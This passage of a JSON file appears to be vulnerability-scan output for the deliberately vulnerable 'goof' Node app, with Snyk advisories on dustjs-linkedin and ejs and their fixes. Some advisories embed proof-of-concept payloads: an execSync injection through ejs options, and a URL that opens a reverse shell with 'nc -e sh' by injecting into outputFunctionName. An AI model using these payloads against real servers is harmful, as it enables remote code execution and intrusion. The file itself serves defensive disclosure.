Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `dustjs-linkedin` to version 3.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/linkedin/dustjs/pull/805/commits/ddb6523832465d38c9d80189e9de60519ac307c3)\n- [GitHub Issue](https://github.com/linkedin/dustjs/issues/804)\n- [GitHub PR](https://github.com/linkedin/dustjs/pull/805)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L/E:P/RL:U/RC:R\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-03-26T13:20:28.488477Z\",\n  \"credit\": [\n    \"baiyecha404\"\n  ],\n  \"cvssScore\": 8.6,\n  \"description\": \"## Overview\\n[dustjs-linkedin](https://www.npmjs.com/package/dustjs-linkedin) is a Javascript templating engine designed to run asynchronously on both the server and the browser.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. It is possible to pollute the `blocks` Array attribute of the object `context` within the `compileBlocks` function. This vulnerability can be leveraged for code execution since  this property is added to the `compiled` function which is then execute by the `vm` module.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `dustjs-linkedin` to version 3.0.0 or higher.\\n## References\\n- [GitHub Commit](https://github.com/linkedin/dustjs/pull/805/commits/ddb6523832465d38c9d80189e9de60519ac307c3)\\n- [GitHub Issue](https://github.com/linkedin/dustjs/issues/804)\\n- [GitHub PR](https://github.com/linkedin/dustjs/pull/805)\\n\",\n  \"disclosureTime\": \"2021-03-26T13:19:46Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.0.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-DUSTJSLINKEDIN-1089257\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-10-21T09:08:02.641971Z\",\n  \"moduleName\": \"dustjs-linkedin\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"dustjs-linkedin\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-04-26T16:18:43Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/linkedin/dustjs/pull/805/commits/ddb6523832465d38c9d80189e9de60519ac307c3\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/linkedin/dustjs/issues/804\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/linkedin/dustjs/pull/805\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.0.0\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"dustjs-linkedin@2.5.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"dustjs-linkedin@3.0.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"dustjs-linkedin\",\n  \"version\": \"2.5.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , dustjs-linkedin@2.5.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "95"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Code Injection",
          "id": "npm:dustjs-linkedin:20160819",
          "desc": "## Overview\n[dustjs-linkedin](https://www.npmjs.com/package/dustjs-linkedin) is a Javascript templating engine designed to run asynchronously on both the server and the browser.\n\nAffected versions of this package are vulnerable to Code Injection. Dust.js uses Javascript's `eval()` function to evaluate the \"if\" statement conditions. The input to the function is sanitized by escaping all potentially dangerous characters.\r\n\r\nHowever, if the variable passed in is an array, no escaping is applied, exposing an easy path to code injection. The risk of exploit is especially high given the fact `express`, `koa` and many other Node.js servers allow users to force a query parameter to be an array using the `param[]=value` notation.\n## Remediation\nUpgrade `dustjs-linkedin` to version 2.6.0 or higher.\n## References\n- [Artsploit Blog](https://artsploit.blogspot.co.il/2016/08/pprce2.html)\n- [GitHub Commit](https://github.com/linkedin/dustjs/pull/534/commits/884be3bb3a34a843e6fb411100088e9b02326bd4)\n- [GitHub Issue](https://github.com/linkedin/dustjs/issues/741)\n- [GitHub PR](https://github.com/linkedin/dustjs/pull/534)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L\",\n  \"alternativeIds\": [\n    \"SNYK-JS-DUSTJSLINKEDIN-10136\"\n  ],\n  \"creationTime\": \"2016-09-14T00:00:00Z\",\n  \"credit\": [\n    \"Michael Stepankin\"\n  ],\n  \"cvssScore\": 8.6,\n  \"description\": \"## Overview\\n[dustjs-linkedin](https://www.npmjs.com/package/dustjs-linkedin) is a Javascript templating engine designed to run asynchronously on both the server and the browser.\\n\\nAffected versions of this package are vulnerable to Code Injection. Dust.js uses Javascript's `eval()` function to evaluate the \\\"if\\\" statement conditions. The input to the function is sanitized by escaping all potentially dangerous characters.\\r\\n\\r\\nHowever, if the variable passed in is an array, no escaping is applied, exposing an easy path to code injection. The risk of exploit is especially high given the fact `express`, `koa` and many other Node.js servers allow users to force a query parameter to be an array using the `param[]=value` notation.\\n## Remediation\\nUpgrade `dustjs-linkedin` to version 2.6.0 or higher.\\n## References\\n- [Artsploit Blog](https://artsploit.blogspot.co.il/2016/08/pprce2.html)\\n- [GitHub Commit](https://github.com/linkedin/dustjs/pull/534/commits/884be3bb3a34a843e6fb411100088e9b02326bd4)\\n- [GitHub Issue](https://github.com/linkedin/dustjs/issues/741)\\n- [GitHub PR](https://github.com/linkedin/dustjs/pull/534)\\n\",\n  \"disclosureTime\": \"2015-01-09T00:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.6.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:dustjs-linkedin:20160819\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-DUSTJSLINKEDIN-10136\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-95\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:40:58.977005Z\",\n  \"moduleName\": \"dustjs-linkedin\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"dustjs-linkedin\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2016-09-14T00:00:00Z\",\n  \"references\": [\n    {\n      \"title\": \"Artsploit Blog\",\n      \"url\": \"https://artsploit.blogspot.co.il/2016/08/pprce2.html\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/linkedin/dustjs/pull/534/commits/884be3bb3a34a843e6fb411100088e9b02326bd4\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/linkedin/dustjs/issues/741\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/linkedin/dustjs/pull/534\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.6.0\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Code Injection\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"dustjs-linkedin@2.5.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"dustjs-linkedin@2.6.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"dustjs-linkedin\",\n  \"version\": \"2.5.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , dustjs-linkedin@2.5.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "94"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Arbitrary Code Injection",
          "id": "SNYK-JS-EJS-1049328",
          "desc": "## Overview\n[ejs](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\n\nAffected versions of this package are vulnerable to Arbitrary Code Injection via the `render` and `renderFile`. If external input is flowing into the `options` parameter, an attacker is able run arbitrary code. This include the `filename`, `compileDebug`, and `client` option.\r\n\r\n## POC\r\n```\r\nlet ejs = require('ejs')\r\nejs.render('./views/test.ejs',{\r\n    filename:'/etc/passwd\\nfinally { this.global.process.mainModule.require(\\'child_process\\').execSync(\\'touch EJS_HACKED\\') }',\r\n    compileDebug: true,\r\n    message: 'test',\r\n    client: true\r\n})\r\n```\n## Remediation\nUpgrade `ejs` to version 3.1.6 or higher.\n## References\n- [GitHub Commit](https://github.com/mde/ejs/commit/abaee2be937236b1b8da9a1f55096c17dda905fd)\n- [GitHub Issue](https://github.com/mde/ejs/issues/571)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L/E:P/RL:U/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-12-09T11:56:59.861160Z\",\n  \"credit\": [\n    \"fangzequn\"\n  ],\n  \"cvssScore\": 4.1,\n  \"description\": \"## Overview\\n[ejs](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\\n\\nAffected versions of this package are vulnerable to Arbitrary Code Injection via the `render` and `renderFile`. If external input is flowing into the `options` parameter, an attacker is able run arbitrary code. This include the `filename`, `compileDebug`, and `client` option.\\r\\n\\r\\n## POC\\r\\n```\\r\\nlet ejs = require('ejs')\\r\\nejs.render('./views/test.ejs',{\\r\\n    filename:'/etc/passwd\\\\nfinally { this.global.process.mainModule.require(\\\\'child_process\\\\').execSync(\\\\'touch EJS_HACKED\\\\') }',\\r\\n    compileDebug: true,\\r\\n    message: 'test',\\r\\n    client: true\\r\\n})\\r\\n```\\n## Remediation\\nUpgrade `ejs` to version 3.1.6 or higher.\\n## References\\n- [GitHub Commit](https://github.com/mde/ejs/commit/abaee2be937236b1b8da9a1f55096c17dda905fd)\\n- [GitHub Issue](https://github.com/mde/ejs/issues/571)\\n\",\n  \"disclosureTime\": \"2020-12-09T11:56:29Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.1.6\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-EJS-1049328\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-94\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-02-09T10:03:10.858458Z\",\n  \"moduleName\": \"ejs\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ejs\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-01-20T16:41:56Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/mde/ejs/commit/abaee2be937236b1b8da9a1f55096c17dda905fd\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/mde/ejs/issues/571\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.1.6\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Arbitrary Code Injection\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"ejs@1.0.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"ejs@3.1.6\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"ejs\",\n  \"version\": \"1.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs-locals@1.0.2 , ejs@0.8.8 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "94"
            ],
            "cveid": [
              "2022-29078"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Remote Code Execution (RCE)",
          "id": "SNYK-JS-EJS-2803307",
          "desc": "## Overview\n[ejs](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the `view options` parameter of `renderFile`, which makes it possible to inject code into `outputFunctionName`.\r\n\r\n\r\n**Note:**\r\nThis vulnerability is exploitable only if the server is already vulnerable to Prototype Pollution.\r\n\r\n## PoC:\r\nCreation of reverse shell:\r\n```\r\nhttp://localhost:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s\r\n```\n## Remediation\nUpgrade `ejs` to version 3.1.7 or higher.\n## References\n- [GitHub Commit](https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf)\n- [GitHub Issue](https://github.com/mde/ejs/issues/451)\n- [GitHub Release](https://github.com/mde/ejs/releases)\n- [Security Advisory](https://eslam.io/posts/ejs-server-side-template-injection-rce/)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2022-04-26T09:01:03.387695Z\",\n  \"credit\": [\n    \"evi0s\"\n  ],\n  \"cvssScore\": 8.1,\n  \"description\": \"## Overview\\n[ejs](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\\n\\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the `view options` parameter of `renderFile`, which makes it possible to inject code into `outputFunctionName`.\\r\\n\\r\\n\\r\\n**Note:**\\r\\nThis vulnerability is exploitable only if the server is already vulnerable to Prototype Pollution.\\r\\n\\r\\n## PoC:\\r\\nCreation of reverse shell:\\r\\n```\\r\\nhttp://localhost:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s\\r\\n```\\n## Remediation\\nUpgrade `ejs` to version 3.1.7 or higher.\\n## References\\n- [GitHub Commit](https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf)\\n- [GitHub Issue](https://github.com/mde/ejs/issues/451)\\n- [GitHub Release](https://github.com/mde/ejs/releases)\\n- [Security Advisory](https://eslam.io/posts/ejs-server-side-template-injection-rce/)\\n\",\n  \"disclosureTime\": \"2022-04-26T08:36:18Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.1.7\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-EJS-2803307\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2022-29078\"\n    ],\n    \"CWE\": [\n      \"CWE-94\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-26T13:41:31.873315Z\",\n  \"moduleName\": \"ejs\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ejs\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2022-04-26T13:41:31.870922Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/mde/ejs/issues/451\"\n    },\n    {\n      \"title\": \"GitHub Release\",\n      \"url\": \"https://github.com/mde/ejs/releases\"\n    },\n    {\n      \"title\": \"Security Advisory\",\n      \"url\": \"https://eslam.io/posts/ejs-server-side-template-injection-rce/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.1.7\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Remote Code Execution (RCE)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"ejs@1.0.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"ejs@3.1.7\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"ejs\",\n  \"version\": \"1.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs@1.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ejs-locals@1.0.2 , ejs@0.8.8 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "94"
            ],
            "cveid": [
              "2017-1000228"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Arbitrary Code Execution",
          "id": "npm:ejs:20161128",
          "desc": "## Overview\r\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\r\nAffected versions of the package are vulnerable to _Remote Code Execution_ by letting the attacker under certain conditions control the source folder from which the engine renders include files.\r\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\r\n\r\nThere's also a [Cross-site Scripting](https://snyk.io/vuln/npm:ejs:20161130) & [Denial of Service](https://snyk.io/vuln/npm:ejs:20161130-1) vulnerabilities caused by the same behaviour. \r\n\r\n## Details\r\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\r\n\r\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\r\n```js\r\nejs.render(str, data, options);\r\n\r\nejs.renderFile(filename, data, options, callback)\r\n```\r\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\r\n```js\r\nejs.render(str, dataAndOptions);\r\n\r\nejs.renderFile(filename, dataAndOptions, callback)\r\n```\r\n\r\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `root` option, which allows changing the project root for includes with an absolute path.  \r\n\r\n```js\r\nejs.renderFile('my-template', {root:'/bad/root/'}, callback);\r\n```\r\n\r\nBy passing along the root directive in the line above, any includes would now be pulled from `/bad/root` instead of the path intended. This allows the attacker to take control of the root directory for included scripts and divert it to a library under his control, thus leading to remote code execution.\r\n\r\nThe [fix](https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\r\n\r\n## Disclosure Timeline\r\n- November 27th, 2016 - Reported the issue to package owner.\r\n- November 27th, 2016 - Issue acknowledged by package owner.\r\n- November 28th, 2016 - Issue fixed and version `2.5.3` released.\r\n\r\n## Remediation\r\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\r\nOtherwise, Upgrade `ejs` to version `2.5.3` or higher.\r\n\r\n## References\r\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\r\n- [Fix commit](https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6)",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H\",\n  \"alternativeIds\": [\n    \"SNYK-JS-EJS-10218\"\n  ],\n  \"creationTime\": \"2016-11-28T18:44:12.405000Z\",\n  \"credit\": [\n    \"Snyk Security Research Team\"\n  ],\n  \"cvssScore\": 8.1,\n  \"description\": \"## Overview\\r\\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\\r\\nAffected versions of the package are vulnerable to _Remote Code Execution_ by letting the attacker under certain conditions control the source folder from which the engine renders include files.\\r\\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\\r\\n\\r\\nThere's also a [Cross-site Scripting](https://snyk.io/vuln/npm:ejs:20161130) & [Denial of Service](https://snyk.io/vuln/npm:ejs:20161130-1) vulnerabilities caused by the same behaviour. \\r\\n\\r\\n## Details\\r\\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\\r\\n\\r\\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\\r\\n```js\\r\\nejs.render(str, data, options);\\r\\n\\r\\nejs.renderFile(filename, data, options, callback)\\r\\n```\\r\\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\\r\\n```js\\r\\nejs.render(str, dataAndOptions);\\r\\n\\r\\nejs.renderFile(filename, dataAndOptions, callback)\\r\\n```\\r\\n\\r\\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `root` option, which allows changing the project root for includes with an absolute path.  \\r\\n\\r\\n```js\\r\\nejs.renderFile('my-template', {root:'/bad/root/'}, callback);\\r\\n```\\r\\n\\r\\nBy passing along the root directive in the line above, any includes would now be pulled from `/bad/root` instead of the path intended. This allows the attacker to take control of the root directory for included scripts and divert it to a library under his control, thus leading to remote code execution.\\r\\n\\r\\nThe [fix](https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\\r\\n\\r\\n## Disclosure Timeline\\r\\n- November 27th, 2016 - Reported the issue to package owner.\\r\\n- November 27th, 2016 - Issue acknowledged by package owner.\\r\\n- November 28th, 2016 - Issue fixed and version `2.5.3` released.\\r\\n\\r\\n## Remediation\\r\\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\\r\\nOtherwise, Upgrade `ejs` to version `2.5.3` or higher.\\r\\n\\r\\n## References\\r\\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\\r\\n- [Fix commit](https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6)\",\n  \"disclosureTime\": \"2016-11-27T22:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.5.3\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"ejs.js\",\n        \"functionName\": \"1.exports.render\"\n      },\n      \"version\": [\n        \"<2.2.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lib/ejs.js\",\n        \"functionName\": \"exports.render\"\n      },\n      \"version\": [\n        \"<2.2.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"ejs.js\",\n        \"functionName\": \"1.cpOptsInData\"\n      },\n      \"version\": [\n        \">=2.2.1 <2.5.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lib/ejs.js\",\n        \"functionName\": \"cpOptsInData\"\n      },\n      \"version\": [\n        \">=2.2.1 <2.5.3\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"ejs.js\",\n        \"functionName\": \"1.exports.render\"\n      },\n      \"version\": [\n        \"<2.2.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lib/ejs.js\",\n        \"functionName\": \"exports.render\"\n      },\n      \"version\": [\n        \"<2.2.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"ejs.js\",\n        \"functionName\": \"1.cpOptsInData\"\n      },\n      \"version\": [\n        \">=2.2.1 <2.5.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lib/ejs.js\",\n        \"functionName\": \"cpOptsInData\"\n      },\n      \"version\": [\n        \">=2.2.1 <2.5.3\"\n      ]\n    }\n  ],\n  \"id\": \"npm:ejs:20161128\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-EJS-10218\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-1000228\"\n    ],\n    \"CWE\": [\n      \"CWE-94\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:49.346213Z\",\n  \"moduleName\": \"ejs\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ejs\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ejs:20161128:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.851976Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ejs/20161128/ejs_20161128_0_0_3d447c5a335844b25faec04b1132dbc721f9c8f6.patch\"\n      ],\n      \"version\": \"<2.5.3 >=2.2.4\"\n    }\n  ],\n  \"proprietary\": true,\n  \"publicationTime\": 